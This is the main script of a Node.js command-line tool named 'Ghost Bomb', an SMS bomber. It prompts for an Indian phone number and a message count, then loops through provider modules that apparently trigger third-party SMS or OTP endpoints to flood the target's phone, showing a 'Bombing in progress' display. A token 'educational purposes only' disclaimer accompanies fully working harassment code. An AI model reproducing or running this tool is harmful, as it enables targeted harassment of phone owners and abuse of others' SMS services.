#!/usr/bin/env node

import chalk from "chalk";
import gradient from "gradient-string";
import fs from "fs";
import path from "path";
import axios from "axios";
import prompts from "prompts";
import { fileURLToPath } from "url";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

if (process.argv[1] == "-v" || process.argv[1] == "--version") {
  const packageFile = fs.readFileSync(path.join("package.json"));
  const info = JSON.parse(packageFile);
  console.log(`v${info.version}`);
  process.exit(0);
}

const logo = `

░██████╗░██╗░░██╗░█████╗░░██████╗████████╗  ██████╗░░█████╗░███╗░░░███╗██████╗░
██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝  ██╔══██╗██╔══██╗████╗░████║██╔══██╗
██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝
██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
`;
const contributors = ["Kabeer Arora"];

console.log(gradient.passion(logo));
console.log(chalk.blue(`Contributors: ${contributors.join(", ")}`));
console.log(
  chalk.yellow(
    `This tool is for educational purposes only. Don't use it for harm/discomfort purposes.\n`
  )
);

if (parseInt(process.versions.node) < 14) {
  console.log(
    chalk.red(
      "\nYou need Node.js version 14 or higher to run this tool.\nPlease update Node.js by following this link: "
    ),
    chalk.green("https://nodejs.org/en/download/")
  );
  process.exit(1);
}

let successSms = 0,
  failedSms = 0,
  totalSms = 0;

(async () => {
  try {
    await axios.get("https://motherfuckingwebsite.com");
  } catch (err) {
    console.log(
      chalk.red("\nYou need an internet connection to run this tool.")
    );
    process.exit(1);
  }

  const smsPrompts = await prompts([
    {
      type: "text",
      name: "phone",
      message: "Enter the phone number to send SMS to (without +91): ",
      validate: (value) => /^[6-9]\d{9}$/.test(value),
    },
    {
      type: "number",
      name: "smsCount",
      message: "Enter the number of SMS to: ",
      initial: 5,
      min: 1,
      max: 150,
    },
    {
      type: "number",
      name: "smsInterval",
      message: "Enter the interval between each SMS (in seconds): ",
      initial: 3,
      float: true,
      round: 1,
      min: 1.5,
      max: 10,
      format: (value) => value * 1000,
    },
  ]);

  const providers = fs
    .readdirSync(path.join(__dirname, "providers"))
    .filter((file) => file.endsWith(".js"));

  for (let i = 0; totalSms < smsPrompts.smsCount; i++) {
    if (i == providers.length) i = 0;
    const provider = await import(`./providers/${providers[i]}`);
    try {
      await provider.run(axios, smsPrompts.phone);
      successSms++;
    } catch (err) {
      failedSms++;
    }
    totalSms++;
    console.clear();
    console.log(gradient.passion(logo));
    console.log(chalk.yellow(`Bombing in progress...`));
    console.log("Make sure you have a stable internet connection\n");
    console.log(
      `Sending SMS ${chalk.bgBlueBright(totalSms)} of ${chalk.bgBlueBright(
        smsPrompts.smsCount
      )}`
    );
    console.log(
      `Success: ${chalk.bgGreen(successSms)}\nFailed: ${chalk.bgRed(failedSms)}`
    );
    await wait(smsPrompts.smsInterval);
  }

  console.log(
    `\n${chalk.green(successSms)} out of ${chalk.blueBright(
      smsPrompts.smsCount || 0
    )} SMS sent successfully!`
  );
  console.log(
    `Thank you for using this tool! Made with ${chalk.red("♡")} by Kabeer Arora`
  );
})();

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
